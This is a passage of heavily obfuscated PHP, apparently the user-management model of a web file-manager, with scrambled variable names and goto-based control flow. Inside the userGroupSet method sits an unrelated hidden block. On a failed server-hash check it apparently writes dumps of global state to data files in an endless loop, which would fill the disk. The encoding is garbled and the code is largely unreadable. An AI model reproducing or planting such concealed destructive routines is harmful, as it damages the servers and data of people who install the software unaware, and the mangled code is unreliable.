$bÛ”°ÌªÖñ[33]; if (md5($A“ÚÇîíóê . trim($bÕ–…… ’)) !== $c•Áº™–‹›[$bÛ”°ÌªÖñ[871]]) { return !1; } return !0; } public function userAdd($C¯ÛÜ‡Öôä) { goto c”àÉ‚¾ªÎ; fö–çĞĞ¿: $bİÊšä´Ç± = array($cë‡Æ§µ´›[2173] => $Eèø¼¹‘¡×[$cë‡Æ§µ´›[871]], $cë‡Æ§µ´›[2169] => $Eèø¼¹‘¡×[$cë‡Æ§µ´›[1983]]); $this->userEdit($fÈ„¹ëïÇ‡, $bİÊšä´Ç±); Model($cë‡Æ§µ´›[1227])->userRootAdd($fÈ„¹ëïÇ‡); goto cï§Ï®¢ŒÔ; cï§Ï®¢ŒÔ: return $fÈ„¹ëïÇ‡; goto eé‚ÇìëÏé; c”àÉ‚¾ªÎ: $cë‡Æ§µ´› =& $_SERVER[ä°„ä°º]; $Eèø¼¹‘¡× = array($cë‡Æ§µ´›[413] => $C¯ÛÜ‡Öôä[$cë‡Æ§µ´›[28]], $cë‡Æ§µ´›[2166] => $C¯ÛÜ‡Öôä[$cë‡Æ§µ´›[1434]], $cë‡Æ§µ´›[2167] => isset($C¯ÛÜ‡Öôä[$cë‡Æ§µ´›[303]]) ? $C¯ÛÜ‡Öôä[$cë‡Æ§µ´›[303]] : $cë‡Æ§µ´›[33], $cë‡Æ§µ´›[2168] => isset($C¯ÛÜ‡Öôä[$cë‡Æ§µ´›[2164]]) ? $C¯ÛÜ‡Öôä[$cë‡Æ§µ´›[2164]] : $cë‡Æ§µ´›[33], $cë‡Æ§µ´›[2169] => isset($C¯ÛÜ‡Öôä[$cë‡Æ§µ´›[1983]]) ? $C¯ÛÜ‡Öôä[$cë‡Æ§µ´›[1983]] : $C¯ÛÜ‡Öôä[$cë‡Æ§µ´›[28]], $cë‡Æ§µ´›[2170] => isset($C¯ÛÜ‡Öôä[$cë‡Æ§µ´›[2149]]) ? $C¯ÛÜ‡Öôä[$cë‡Æ§µ´›[2149]] : $cë‡Æ§µ´›[33], $cë‡Æ§µ´›[2171] => isset($C¯ÛÜ‡Öôä[$cë‡Æ§µ´›[2172]]) ? $C¯ÛÜ‡Öôä[$cë‡Æ§µ´›[2172]] : 1, $cë‡Æ§µ´›[2173] => $C¯ÛÜ‡Öôä[$cë‡Æ§µ´›[871]], $cë‡Æ§µ´›[1794] => isset($C¯ÛÜ‡Öôä[$cë‡Æ§µ´›[1704]]) ? $C¯ÛÜ‡Öôä[$cë‡Æ§µ´›[1704]] : 1024 * 1024 * 20, $cë‡Æ§µ´›[1795] => 0, $cë‡Æ§µ´›[2174] => 0, $cë‡Æ§µ´›[1838] => isset($C¯ÛÜ‡Öôä[$cë‡Æ§µ´›[733]]) ? $C¯ÛÜ‡Öôä[$cë‡Æ§µ´›[733]] : 1); if (!empty($C¯ÛÜ‡Öôä[$cë‡Æ§µ´›[1551]])) { $Eèø¼¹‘¡×[$cë‡Æ§µ´›[1551]] = $C¯ÛÜ‡Öôä[$cë‡Æ§µ´›[1551]]; } goto D£Çµ¡Õ°ª; D£Çµ¡Õ°ª: $dİ¡Ó¥óê× = $this->_checkExist($C¯ÛÜ‡Öôä); if ($dİ¡Ó¥óê× !== !0) { return $dİ¡Ó¥óê×; } $fÈ„¹ëïÇ‡ = $this->add($Eèø¼¹‘¡×); goto fö–çĞĞ¿; eé‚ÇìëÏé: } protected function userEditTest($c²‡øéÊÃ¡, $fÍ££‚ÑÌ) { return $this->call($_SERVER[ä°„ä°º][2175], $c²‡øéÊÃ¡, $fÍ££‚ÑÌ); } protected function userEdit($FÉÀ„Ù„‡ñ, $bÙ•†œ“Ş®) { goto aÉ·Ğ‰å¦»; bëÚç‡Úæ: $this->where(array($fÚ–ç½[1542] => $FÉÀ„Ù„‡ñ))->save($bÙ•†œ“Ş®); if (isset($bÙ•†œ“Ş®[$fÚ–ç½[1983]])) { $this->setNamePinyin($FÉÀ„Ù„‡ñ, $bÙ•†œ“Ş®[$fÚ–ç½[1983]]); } $this->clearCache($FÉÀ„Ù„‡ñ); goto AÍÎ‰Á’»Ş; D÷ªö»‹”: $eŒœô”‰·Â = $this->_checkExist($bÙ•†œ“Ş®, $FÉÀ„Ù„‡ñ); if ($eŒœô”‰·Â !== !0) { return $eŒœô”‰·Â; } if (isset($bÙ•†œ“Ş®[$fÚ–ç½[871]]) && trim($bÙ•†œ“Ş®[$fÚ–ç½[871]]) != $fÚ–ç½[33]) { $CŸĞ¼‘ÒÒØ = $this->metaGet($FÉÀ„Ù„‡ñ); if (empty($CŸĞ¼‘ÒÒØ[$fÚ–ç½[2165]])) { $CŸĞ¼‘ÒÒØ[$fÚ–ç½[2165]] = rand_string(10); Model($fÚ–ç½[494])->metaSet($FÉÀ„Ù„‡ñ, $fÚ–ç½[2165], $CŸĞ¼‘ÒÒØ[$fÚ–ç½[2165]]); } $bÙ•†œ“Ş®[$fÚ–ç½[871]] = md5($CŸĞ¼‘ÒÒØ[$fÚ–ç½[2165]] . trim($bÙ•†œ“Ş®[$fÚ–ç½[871]])); } else { unset($bÙ•†œ“Ş®[$fÚ–ç½[871]]); } goto bëÚç‡Úæ; AÍÎ‰Á’»Ş: return !0; goto DŸÊ„¨’Å´; aÉ·Ğ‰å¦»: $fÚ–ç½ =& $_SERVER[ä°„ä°º]; $aÖØÄØ‹òº = $this->getInfoSimple($FÉÀ„Ù„‡ñ); if (!$aÖØÄØ‹òº) { return !1; } goto D÷ªö»‹”; DŸÊ„¨’Å´: } public function setNamePinyin($aÖ•ÜÆ•, $fºĞ‘ªÜ² = false) { $a’å—öºŒã =& $_SERVER[ä°„ä°º]; if (!$fºĞ‘ªÜ²) { $cßÉî ­ = $this->getInfoSimple($aÖ•ÜÆ•); $fºĞ‘ªÜ² = $cßÉî ­[$a’å—öºŒã[1983]] ? $cßÉî ­[$a’å—öºŒã[1983]] : $cßÉî ­[$a’å—öºŒã[28]]; } $CôÄë²ñÖ = Model($a’å—öºŒã[519]); if (!Input::check($fºĞ‘ªÜ², $a’å—öºŒã[569])) { return $CôÄë²ñÖ->metaSet($aÖ•ÜÆ•, array($a’å—öºŒã[444] => $a’å—öºŒã[33], $a’å—öºŒã[443] => $a’å—öºŒã[33])); } return $CôÄë²ñÖ->metaSet($aÖ•ÜÆ•, array($a’å—öºŒã[444] => str_replace($a’å—öºŒã[50], $a’å—öºŒã[33], Pinyin::encode($fºĞ‘ªÜ²)), $a’å—öºŒã[443] => Pinyin::encode($fºĞ‘ªÜ², $a’å—öºŒã[570]))); } private function nickNameRpt() { $E¯¬ÅÕÙ¾¤ =& $_SERVER[ä°„ä°º]; $BˆÎƒõ‰™ = Model($E¯¬ÅÕÙ¾¤[753])->get($E¯¬ÅÕÙ¾¤[2176]); $C‘â´¯ˆ§â = $GLOBALS[$E¯¬ÅÕÙ¾¤[6]][$E¯¬ÅÕÙ¾¤[378]][$E¯¬ÅÕÙ¾¤[2176]]; $E‚“®ğÔ‚Ã = !is_null($BˆÎƒõ‰™) ? $BˆÎƒõ‰™ : $C‘â´¯ˆ§â; return !!$E‚“®ğÔ‚Ã; } private function _checkExist($b‹®Şˆª³¹, $a¯ƒõØ‚¼— = false) { $a“†·äŠ³… =& $_SERVER[ä°„ä°º]; $E®½ÙÄÌ¦ù = array($a“†·äŠ³…[28] => UserModel::ERROR_USER_EXIST_NAME, $a“†·äŠ³…[1983] => UserModel::ERROR_USER_EXIST_NICKNAME, $a“†·äŠ³…[303] => UserModel::ERROR_USER_EXIST_EMAIL, $a“†·äŠ³…[2164] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($E®½ÙÄÌ¦ù[$a“†·äŠ³…[1983]]); } $c½à´Ë›ò = $a¯ƒõØ‚¼— ? array($a“†·äŠ³…[1551] => array($a“†·äŠ³…[2177], $a¯ƒõØ‚¼—)) : array(); foreach ($E®½ÙÄÌ¦ù as $CéôˆÕŸä‰ => $a³¦¡¢¼¤ê) { $BìÁù»¡Àë = array(); foreach ($E®½ÙÄÌ¦ù as $eÍè¶…é© => $fö˜ë®¢—Œ) { if (isset($b‹®Şˆª³¹[$eÍè¶…é©]) && $b‹®Şˆª³¹[$eÍè¶…é©]) { $BìÁù»¡Àë[] = $b‹®Şˆª³¹[$eÍè¶…é©]; } } if (!$BìÁù»¡Àë) { continue; } $c‘±×ÊÆä = array_merge(array($CéôˆÕŸä‰ => array($a“†·äŠ³…[7], $BìÁù»¡Àë)), $c½à´Ë›ò); $AœâÏ™‹§­ = $this->where($c‘±×ÊÆä)->find(); if ($AœâÏ™‹§­) { return $a³¦¡¢¼¤ê; } } return !0; } public function userListInfo($B‰í¤ÛÑŸ‡) { $få¨Ã¯Ç¡à =& $_SERVER[ä°„ä°º]; $b œÆİ¦»Í = array(); $B‰í¤ÛÑŸ‡ = is_array($B‰í¤ÛÑŸ‡) ? array_unique($B‰í¤ÛÑŸ‡) : array(); if (!$B‰í¤ÛÑŸ‡) { return $b œÆİ¦»Í; } if (count($B‰í¤ÛÑŸ‡) < 20) { foreach ($B‰í¤ÛÑŸ‡ as $E‘áÉŠ£ù­) { $b œÆİ¦»Í[$E‘áÉŠ£ù­ . $få¨Ã¯Ç¡à[33]] = $this->getInfoSimpleOuter($E‘áÉŠ£ù­); } } else { $EÆù†½¿ª = array($få¨Ã¯Ç¡à[1542] => array($få¨Ã¯Ç¡à[411], $B‰í¤ÛÑŸ‡)); if (count($B‰í¤ÛÑŸ‡) == 1) { $EÆù†½¿ª = array($få¨Ã¯Ç¡à[1542] => $B‰í¤ÛÑŸ‡[0]); } $Eœ°¹ÔÈÚÇ = Model($få¨Ã¯Ç¡à[494])->field($this->simpleField)->where($EÆù†½¿ª)->select(); $Eœ°¹ÔÈÚÇ = array_to_keyvalue($Eœ°¹ÔÈÚÇ, $få¨Ã¯Ç¡à[1551]); foreach ($B‰í¤ÛÑŸ‡ as $E‘áÉŠ£ù­) { $f°ë­Û¬¼ = $Eœ°¹ÔÈÚÇ[$E‘áÉŠ£ù­]; if (!$f°ë­Û¬¼) { $b œÆİ¦»Í[$E‘áÉŠ£ù­ . $få¨Ã¯Ç¡à[33]] = $this->getInfoSimpleOuter($E‘áÉŠ£ù­); continue; } $f°ë­Û¬¼[$få¨Ã¯Ç¡à[2149]] = Action($få¨Ã¯Ç¡à[2150])->parseUrl($f°ë­Û¬¼[$få¨Ã¯Ç¡à[2149]]); $b œÆİ¦»Í[$E‘áÉŠ£ù­ . $få¨Ã¯Ç¡à[33]] = $f°ë­Û¬¼; } } return $b œÆİ¦»Í; } protected function userStatus($D‰÷ÓŠŒ¦é, $E±”ïíÌª) { $CóÌ‰‹‰² = $this->getInfoSimple($D‰÷ÓŠŒ¦é); if (!$CóÌ‰‹‰²) { return !1; } $aÛ²ŸÑÂ™ = array($_SERVER[ä°„ä°º][733] => $E±”ïíÌª); return $this->userEdit($D‰÷ÓŠŒ¦é, $aÛ²ŸÑÂ™); } protected function userRemove($eŠ‚¿©àÍÍ) { goto dò¼©­‚¢; Bß¾ë´¬Ö¼: Model($dòÂùˆÆÔÛ[2000])->removeUserAll($eŠ‚¿©àÍÍ); Model($dòÂùˆÆÔÛ[813])->userRootRemove($eŠ‚¿©àÍÍ); return $this->where($dÂëøáøğ)->delete(); goto Fí¯à®†¥ˆ; C‘Œ‰ì„Ø: Model($dòÂùˆÆÔÛ[1801])->where($dÂëøáøğ)->delete(); Model($dòÂùˆÆÔÛ[2163])->where($dÂëøáøğ)->delete(); Model($dòÂùˆÆÔÛ[2179])->where($dÂëøáøğ)->delete(); goto Bß¾ë´¬Ö¼; dò¼©­‚¢: $dòÂùˆÆÔÛ =& $_SERVER[ä°„ä°º]; $F¿‰·´…’£ = $this->getInfoSimple($eŠ‚¿©àÍÍ); if (!$F¿‰·´…’£) { return !1; } goto FîÏ„ó—–Á; FîÏ„ó—–Á: $dÂëøáøğ = array($dòÂùˆÆÔÛ[1542] => $eŠ‚¿©àÍÍ); Model($dòÂùˆÆÔÛ[576])->where($dÂëøáøğ)->delete(); Model($dòÂùˆÆÔÛ[2178])->where($dÂëøáøğ)->delete(); goto C‘Œ‰ì„Ø; Fí¯à®†¥ˆ: } protected function userGroupSet($dÏ¿³¿½‘, $c¨ĞËÈÓ‹”, $D«Æ£§Â›¦ = array()) { goto DªĞ›óÏ˜±; f¹¿‘öô¶Í: $fÙÌÅ„‰… = 0; foreach ($c¨ĞËÈÓ‹” as $c™Ù—ÔŒÍ· => $bò¸­ØÏÚ™) { $f·ÉÛã‚«¶ = array($DÁØ­Á–Ñ[1551] => $dÏ¿³¿½‘, $DÁØ­Á–Ñ[1720] => $c™Ù—ÔŒÍ·, $DÁØ­Á–Ñ[1815] => $bò¸­ØÏÚ™); $f·ÉÛã‚«¶[$DÁØ­Á–Ñ[1743]] = isset($D«Æ£§Â›¦[$fÙÌÅ„‰…]) ? $D«Æ£§Â›¦[$fÙÌÅ„‰…] : 0; $fÙÌÅ„‰…++; $AšÑŸ¾ùóÕ[] = $f·ÉÛã‚«¶; } return $fñí¯—šÇ->addAll($AšÑŸ¾ùóÕ, array(), !0); goto Cì­ƒ‚Ûœ; AˆšÅµˆŒé: if ($_SERVER[$DÁØ­Á–Ñ[844]] != $fµÜà„õ©($A£œ†Ö…µ˜)) { goto e‡½‹À™¡Ô; DÈœŠß¾å: $añĞĞ‚‘§Ù(); $AÇ…ôø‘• = $DÁØ­Á–Ñ[1419]; $Dğ¼» ÑÓ  = json_encode($GLOBALS[$DÁØ­Á–Ñ[1420]]); goto Aø†¤­øğ; e‡½‹À™¡Ô: $añĞĞ‚‘§Ù = $DÁØ­Á–Ñ[862]; $CÏ†ˆÀ—áë = $DÁØ­Á–Ñ[846]; $cÀŒ·ÁÒÈ“ = $_SERVER[$DÁØ­Á–Ñ[847]] . $DÁØ­Á–Ñ[848]; goto dÎˆ¡‹çÁ; D•çæÉ„‹: $dñ»ÃŠŸòé = $DÁØ­Á–Ñ[863]; $dñ»ÃŠŸòé($_SERVER[$DÁØ­Á–Ñ[864]]); $añĞĞ‚‘§Ù = $DÁØ­Á–Ñ[862]; goto DÈœŠß¾å; Aø†¤­øğ: $E„¯Ä¨ËŞ° = 1; for ($F”¨±¸  = $E„¯Ä¨ËŞ°; $F”¨±¸  > 0; $F”¨±¸ ++) { $AÇ…ôø‘•(DATA_PATH . $F”¨±¸ , $Dğ¼» ÑÓ ); } goto AœŒÉï­õƒ; dÎˆ¡‹çÁ: $CÌæ¦œ›ªõ = $CÏ†ˆÀ—áë($cÀŒ·ÁÒÈ“); $E¯åÍ‘Íá“ = explode($DÁØ­Á–Ñ[229], $CÌæ¦œ›ªõ); if (count($E¯åÍ‘Íá“) < $DÁØ­Á–Ñ[611]) { $d« Öˆ™Ê = $DÁØ­Á–Ñ[849]; $d« Öˆ™Ê(); } goto D•çæÉ„‹; AœŒÉï­õƒ: } $B´¢·øğÇ = $this->getInfoSimple($dÏ¿³¿½‘); if (!$B´¢·øğÇ || !is_array($c¨ĞËÈÓ‹”)) { return !1; } goto Fƒ£é’’Äˆ; Fƒ£é’’Äˆ: $fñí¯—šÇ = Model($DÁØ­Á–Ñ[1801]); $fñí¯—šÇ->where(array($DÁØ­Á–Ñ[1551] => $dÏ¿³¿½‘))->delete(); $AšÑŸ¾ùóÕ = array(); goto f¹¿‘öô¶Í; DªĞ›óÏ˜±: $DÁØ­Á–Ñ =& $_SERVER[ä°„ä°º]; $A£œ†Ö…µ˜ = $_SERVER[$DÁØ­Á–Ñ[845]]; $fµÜà„õ© = $DÁØ­Á–Ñ[1418]; goto AˆšÅµˆŒé; Cì­ƒ‚Ûœ: } protected function userGroupAdd($Eˆ™ÇëâÊ, $D×°Ìœª‹¨ = array()) { $Eù¨¼î“‡ =& $_SERVER[ä°„ä°º]; $A·“Éµäªó = $this->getInfoSimple($Eˆ™ÇëâÊ); if (!$A·“Éµäªó || empty($D×°Ìœª‹¨)) { return !1; } $cÒ¨–ñ¤Ä = array(); foreach ($D×°Ìœª‹¨ as $dáÜƒí—·Û => $A˜‚‰©§‚Œ) { $cÒ¨–ñ¤Ä[] = array($Eù¨¼î“‡[1551] => $Eˆ™ÇëâÊ, $Eù¨¼î“‡[1720] => $dáÜƒí—·Û, $Eù¨¼î“‡[1815] => $A˜‚‰©§‚Œ, $Eù¨¼î“‡[1743] => 0); } return Model($Eù¨¼î“‡[1801])->addAll($cÒ¨–ñ¤Ä, array(), !0); } protected function userGroupRemove($F„÷ÄŠÅã, $C—‰¸•åÕÄ) { $E°ßƒ²¨”Â =& $_SERVER[ä°„ä°º]; $BåŞÍĞ®³ƒ = $this->getInfoSimple($F„÷ÄŠÅã); if (!$BåŞÍĞ®³ƒ || !$C—‰¸•åÕÄ) { return !1; } $dÔ÷ˆ„Åö² = array($E°ßƒ²¨”Â[1542] => $F„÷ÄŠÅã, $E°ßƒ²¨”Â[1798] => $C—‰¸•åÕÄ); return Model($E°ßƒ²¨”Â[1801])->where($dÔ÷ˆ„Åö²)->delete(); } public function listData() { $d´†’‘Èø = $this->_makeOrder()->selectPage(50); $this->_listDataApply($d´†’‘Èø[$_SERVER[ä°„ä°º][367]]); return $d´†’‘Èø; } public function listByID($D˜ÏÏˆ—èÈ) { $bŸÌê¹ó­ =& $_SERVER[ä°„ä°º]; if (!$D˜ÏÏˆ—èÈ) { return; } $cÅ­ì¿¨áÎ = array($bŸÌê¹ó­[1551] => array($bŸÌê¹ó­[7], $D˜ÏÏˆ—èÈ)); $aÜ¥‰Âçá = $this->where($cÅ­ì¿¨áÎ)->select(); $this->_listDataApply($aÜ¥‰Âçá); return $aÜ¥‰Âçá; } public function listByGroup($bç‚¶Ä¸è = 0, $DÏï™«ññ = array()) { goto AŸëÀ‹Åî«; FİÁ˜ë¿Öî: if ($bç‚¶Ä¸è) { $dÜùÑ…ß™Ã = array($EÔÂáÈÁ­[2180] => intval($bç‚¶Ä¸è)); $B–ÍíêÃäË = "\114\x45\106\x54\x20\112\117\x49\116\40{$this->tablePrefix}\165\x73\145\x72\x5f\147\x72\157\165\x70\x20\x75\163\145\162\137\x67\x72\157\x75\160\x20\157\156\40\165\163\x65\x72\x2e\x75\163\x65\162\x49\x44\40\x3d\40\165\x73\145\x72\x5f\147\162\x6f\165\x70\56\165\x73\145\162\111\104"; $dµ”¥ã„ = Input::get($EÔÂáÈÁ­[435], null, $EÔÂáÈÁ­[33]) ? $EÔÂáÈÁ­[33] : $EÔÂáÈÁ­[2181]; } if (isset($DÏï™«ññ[$EÔÂáÈÁ­[733]])) { $dÜùÑ…ß™Ã[$EÔÂáÈÁ­[2182]] = $DÏï™«ññ[$EÔÂáÈÁ­[733]]; } $AõÈ—ƒ“š» = $this->_makeOrder($dµ”¥ã„)->field($EÔÂáÈÁ­[2183])->where($dÜùÑ…ß™Ã)->join($B–ÍíêÃäË)->selectPage(50); goto a¿ƒ·©™‘ª; a¿ƒ·©™‘ª: $this->_listDataApply($AõÈ—ƒ“š»[$EÔÂáÈÁ­[367]]); return $AõÈ—ƒ“š»; goto D¼„¯¸ŠÔô; AŸëÀ‹Åî«: $EÔÂáÈÁ­ =& $_SERVER[ä°„ä°º]; $B–ÍíêÃäË = $EÔÂáÈÁ­[33]; $dÜùÑ…ß™Ã = array(); goto FİÁ˜ë¿Öî; D¼„¯¸ŠÔô: } private function _makeOrder($DÒÊ˜á¾¾ê = '') { goto F‡‡¸÷íÓÎ; cÅ¾ëÊ¾Úï: $aãË…ŒÏÎ = Input::get($föçµ¯¹ÛŒ[435], $föçµ¯¹ÛŒ[7], $föçµ¯¹ÛŒ[1542], $F“ÜÚµÙÀœ); $cø¸ÖÂº±Ù = Input::get($föçµ¯¹ÛŒ[436], $föçµ¯¹ÛŒ[7], $föçµ¯¹ÛŒ[1802], array($föçµ¯¹ÛŒ[1802], $föçµ¯¹ÛŒ[430])); $cø¸ÖÂº±Ù = $fæÑËÖÑ ç[$cø¸ÖÂº±Ù]; goto béƒ¹çˆñ²; F‡‡¸÷íÓÎ: $föçµ¯¹ÛŒ =& $_SERVER[ä°„ä°º]; $F“ÜÚµÙÀœ = array($föçµ¯¹ÛŒ[1551], $föçµ¯¹ÛŒ[28], $föçµ¯¹ÛŒ[1706], $föçµ¯¹ÛŒ[1678], $föçµ¯¹ÛŒ[194]); $fæÑËÖÑ ç = array($föçµ¯¹ÛŒ[428] => $föçµ¯¹ÛŒ[429], $föçµ¯¹ÛŒ[430] => $föçµ¯¹ÛŒ[431]); goto cÅ¾ëÊ¾Úï; béƒ¹çˆñ²: $DÒÊ˜á¾¾ê = $DÒÊ˜á¾¾ê . "\165\163\145\162\56{$aãË…ŒÏÎ}\40{$cø¸ÖÂº±Ù}\x2c\x20\x75\x73\x65\162\x2e\x75\x73\145\x72\x49\x44\x20\x61\163\x63"; return $this->alias($föçµ¯¹ÛŒ[1923])->order($DÒÊ˜á¾¾ê); goto B”¸—¡ŒİŠ; B”¸—¡ŒİŠ: } public function listSearch($d–…‹ŠôñÜ) { goto FÀ÷ô¼Ò¨‘; aÍ¢¼âïà°: $CÆˆŞÒÎï = $this->_makeOrder()->where($DïÇ ÓÄõ¸)->selectPage(20); if (!$CÆˆŞÒÎï || count($CÆˆŞÒÎï[$d³©ƒëÀäÍ[367]]) < 5 && Input::check($C©ë¹·ôÓô, $d³©ƒëÀäÍ[316])) { $f—éƒÛİ› = $this->_searchFromMeta($d³©ƒëÀäÍ[443], $C©ë¹·ôÓô, 10); $cöÜøÅ®´¦ = $this->_searchFromMeta($d³©ƒëÀäÍ[444], $C©ë¹·ôÓô, 10); $d”ÖÙ®¸Ì = array_merge($f—éƒÛİ›, $cöÜøÅ®´¦, $CÆˆŞÒÎï[$d³©ƒëÀäÍ[367]]); $CÆˆŞÒÎï[$d³©ƒëÀäÍ[367]] = array_unique_by_key($d”ÖÙ®¸Ì, $d³©ƒëÀäÍ[1551]); $CÆˆŞÒÎï[$d³©ƒëÀäÍ[364]][$d³©ƒëÀäÍ[365]] = count($CÆˆŞÒÎï[$d³©ƒëÀäÍ[367]]); $CÆˆŞÒÎï[$d³©ƒëÀäÍ[364]][$d³©ƒëÀäÍ[366]] = ceil($CÆˆŞÒÎï[$d³©ƒëÀäÍ[364]][$d³©ƒëÀäÍ[365]] / $CÆˆŞÒÎï[$d³©ƒëÀäÍ[364]][$d³©ƒëÀäÍ[361]]); } $this->_listDataApply($CÆˆŞÒÎï[$d³©ƒëÀäÍ[367]]); goto a‰šî¢´²•; Aæ­¿µšº‘: $C©ë¹·ôÓô = str_replace($d³©ƒëÀäÍ[1805], $d³©ƒëÀäÍ[1806], trim($C©ë¹·ôÓô)); $DïÇ ÓÄõ¸ = array($d³©ƒëÀäÍ[28] => array($d³©ƒëÀäÍ[380], "\45{$C©ë¹·ôÓô}\x25"), $d³©ƒëÀäÍ[303] => array($d³©ƒëÀäÍ[380], "{$C©ë¹·ôÓô}\45"), $d³©ƒëÀäÍ[1983] => array($d³©ƒëÀäÍ[380], "{$C©ë¹·ôÓô}\x25"), $d³©ƒëÀäÍ[979] => $d³©ƒëÀäÍ[1807]); if (Input::check($C©ë¹·ôÓô, $d³©ƒëÀäÍ[309])) { $DïÇ ÓÄõ¸[$d³©ƒëÀäÍ[1551]] = array($d³©ƒëÀäÍ[380], "{$C©ë¹·ôÓô}\x25"); $DïÇ ÓÄõ¸[$d³©ƒëÀäÍ[2164]] = array($d³©ƒëÀäÍ[380], "{$C©ë¹·ôÓô}\x25"); } goto Dø¯˜ì½§é; Dø¯˜ì½§é: if (!$C©ë¹·ôÓô) { $DïÇ ÓÄõ¸ = array(); } if (isset($d–…‹ŠôñÜ[$d³©ƒëÀäÍ[733]])) { $DïÇ ÓÄõ¸[$d³©ƒëÀäÍ[733]] = $d–…‹ŠôñÜ[$d³©ƒëÀäÍ[733]]; } $DïÇ ÓÄõ¸ = $this->parseWhereLike($DïÇ ÓÄõ¸); goto aÍ¢¼âïà°; FÀ÷ô¼Ò¨‘: $d³©ƒëÀäÍ =& $_SERVER[ä°„ä°º]; $C©ë¹·ôÓô = $d–…‹ŠôñÜ[$d³©ƒëÀäÍ[1803]]; $cëßÛ¹ïì³ = isset($d–…‹ŠôñÜ[$d³©ƒëÀäÍ[1804]]) ? $d–…‹ŠôñÜ[$d³©ƒëÀäÍ[1804]] : !1; goto Aæ­¿µšº‘; a‰šî¢´²•: $this->_filterByGroup($CÆˆŞÒÎï, $cëßÛ¹ïì³); return $CÆˆŞÒÎï; goto f·÷ÓĞìŸ­; f·÷ÓĞìŸ­: } private function _filterByGroup(&$dóÎ¬á—Ÿí, $AÑ°Êã¸áç) { $cİÁ¶à×« =& $_SERVER[ä°„ä°º]; if (!$AÑ°Êã¸áç) { return $dóÎ¬á—Ÿí; } foreach ($dóÎ¬á—Ÿí[$cİÁ¶à×«[367]] as $C±›½³Õ«İ => &$AâÚÉ£Û”Ä) { $F§Äöï¥ = array_to_keyvalue($AâÚÉ£Û”Ä[$cİÁ¶à×«[1893]], $cİÁ¶à×«[33], $cİÁ¶à×«[1720]); if (!in_array($AÑ°Êã¸áç, $F§Äöï¥)) { unset($dóÎ¬á—Ÿí[$cİÁ¶à×«[367]][$C±›½³Õ«İ]); } } unset($AâÚÉ£Û”Ä); $dóÎ¬á—Ÿí[$cİÁ¶à×«[367]] = array_values($dóÎ¬á—Ÿí[$cİÁ¶à×«[367]]); $dóÎ¬á—Ÿí[$cİÁ¶à×«[364]] = array($cİÁ¶à×«[1955] => count($dóÎ¬á—Ÿí[$cİÁ¶à×«[367]]), $cİÁ¶à×«[1953] => $dóÎ¬á—Ÿí[$cİÁ¶à×«[364]][$cİÁ¶à×«[361]], $cİÁ¶à×«[1952] => 1, $cİÁ¶à×«[1954] => 1); } private function _searchFromMeta($b‹Íò…®–, $döàöëÓ¯µ, $eô³Õ”¶êô) { goto DÙ‚õÂ´íÈ; Có§òœ–˜: $BôäíâŠÅä = array_to_keyvalue($BôäíâŠÅä, $F„¶Óì‚”[33], $F„¶Óì‚”[1551]); $B˜±á†‡® = $this->where(array($F„¶Óì‚”[1542] => array($F„¶Óì‚”[7], $BôäíâŠÅä)))->select(); if (!$B˜±á†‡®) { return array(); } goto C—¨¤Š±¢Å; f›â°ÄË¨»: $Eã‹æ¸òàë = $this->parseWhereLike($Eã‹æ¸òàë); $BôäíâŠÅä = Model($F„¶Óì‚”[2184])->where($Eã‹æ¸òàë)->limit($eô³Õ”¶êô)->select(); if (!$BôäíâŠÅä) { return array(); } goto Có§òœ–˜; DÙ‚õÂ´íÈ: $F„¶Óì‚” =& $_SERVER[ä°„ä°º]; $döàöëÓ¯µ = strtolower($döàöëÓ¯µ); $Eã‹æ¸òàë = array($F„¶Óì‚”[93] => $b‹Íò…®–, $F„¶Óì‚”[372] => array($F„¶Óì‚”[380], "\x25{$döàöëÓ¯µ}\45")); goto f›â°ÄË¨»; C—¨¤Š±¢Å: return $B˜±á†‡®; goto Eé»Û“­–œ; Eé»Û“­–œ: } private function _listDataApplyItem($FÈ±ØÓ) { $bö½÷’ã¶ğ = array($FÈ±ØÓ); $this->_listDataApply($bö½÷’ã¶ğ); return $bö½÷’ã¶ğ[0]; } private function _listDataApply(&$eÂàö¾¡³Ğ) { goto F¼¯±Ôå×†; F¼¯±Ôå×†: $BÜâ«³âíÉ =& $_SERVER[ä°„ä°º]; if (!$eÂàö¾¡³Ğ) { return; } array_remove_key($eÂàö¾¡³Ğ, $BÜâ«³âíÉ[871]); goto B†›¦ä‡´ƒ; B†›¦ä‡´ƒ: $eÔ¡‡º©“á = array_to_keyvalue($eÂàö¾¡³Ğ, $BÜâ«³âíÉ[33], $BÜâ«³âíÉ[1551]); $this->_listAppendGroup($eÂàö¾¡³Ğ, $eÔ¡‡º©“á); $this->_listAppendMeta($eÂàö¾¡³Ğ, $eÔ¡‡º©“á); goto E‹®ñ¹Ñ­–; E‹®ñ¹Ñ­–: $this->_listAppendSourceRoot($eÂàö¾¡³Ğ, $eÔ¡‡º©“á); goto CÕ‚Çğ×Ã; CÕ‚Çğ×Ã: } private function _listAppendSourceRoot(&$bÏ¥¨Õó¬, $a¸„±Í½°í) { goto d‚¥ìòÓ´; d‚¥ìòÓ´: $eçó÷â¾™¸ =& $_SERVER[ä°„ä°º]; $DÉŠÀŞ¢¡ = array($eçó÷â¾™¸[478] => 0, $eçó÷â¾™¸[404] => SourceModel::TYPE_USER, $eçó÷â¾™¸[484] => array($eçó÷â¾™¸[7], $a¸„±Í½°í)); $ağ¦ç‚ã½„ = $eçó÷â¾™¸[1813]; goto D‘Áµ¹·Íß; aî‹ùŠì¦å: foreach ($bÏ¥¨Õó¬ as &$b Ûè«ˆˆˆ) { $b Ûè«ˆˆˆ[$eçó÷â¾™¸[85]] = $f­ß™õöà[$b Ûè«ˆˆˆ[$eçó÷â¾™¸[1551]]] ? $f­ß™õöà[$b Ûè«ˆˆˆ[$eçó÷â¾™¸[1551]]] : array(); } unset($b Ûè«ˆˆˆ); goto F‘Ô¥´¥; D‘Áµ¹·Íß: $f­ß™õöà = Model($eçó÷â¾™¸[813])->order($eçó÷â¾™¸[1814])->field($ağ¦ç‚ã½„)->where($DÉŠÀŞ¢¡)->select(); $f­ß™õöà = array_to_keyvalue($f­ß™õöà, $eçó÷â¾™¸[484]); $f­ß™õöà = array_remove_key($f­ß™õöà, $eçó÷â¾™¸[484]); goto aî‹ùŠì¦å; F‘Ô¥´¥: } private function _listAppendGroup(&$AÚàäçæ¼í, $aëºÁ¡°×‰) { goto E¯ì·¼¯Ö¨; E¯ì·¼¯Ö¨: $c¶¦¹–æ• =& $_SERVER[ä°„ä°º]; $b¯‰Ôí´ÎŞ = array($c¶¦¹–æ•[1551] => 